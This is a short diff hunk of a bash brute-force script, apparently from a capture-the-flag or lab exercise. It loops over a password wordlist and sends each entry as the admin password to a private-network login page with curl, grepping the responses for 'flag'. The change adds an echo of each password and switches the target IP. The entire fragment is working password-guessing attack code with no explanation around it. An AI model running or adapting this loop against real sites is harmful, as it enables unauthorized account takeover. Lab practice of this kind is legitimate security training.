@@ -1421,5 +1421,6 @@ shutup
 taytay)
 
 for i in ${password[@]}; do
-	curl -X POST "http://192.168.56.101/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
+	echo ${i};
+	curl -X POST "http://192.168.43.139/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
 done
